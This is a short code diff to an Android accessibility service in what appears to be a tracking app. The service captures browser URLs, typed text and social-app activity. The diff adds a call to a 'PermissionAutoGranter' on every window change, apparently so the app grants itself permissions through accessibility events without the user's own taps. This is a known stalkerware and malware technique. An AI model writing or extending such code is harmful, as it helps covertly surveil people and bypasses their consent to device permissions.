@@ -6,6 +6,7 @@ import android.os.Handler
 import android.os.Looper
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.takip.app.util.PermissionAutoGranter
 import com.takip.app.util.PrefsManager
 
 class TakipAccessibilityService : AccessibilityService() {
@@ -52,12 +53,9 @@ class TakipAccessibilityService : AccessibilityService() {
                 captureBrowserUrl(pkg, event)
                 debounceTextInput(pkg, event)
             }
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                if (socialPackages.any { pkg.startsWith(it) }) {
-                    debounceSocialCapture(pkg)
-                }
-            }
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                PermissionAutoGranter.tryAutoGrant(this)
                 if (browserPackages.any { pkg.startsWith(it) }) {
                     captureBrowserUrl(pkg, event)
                 }
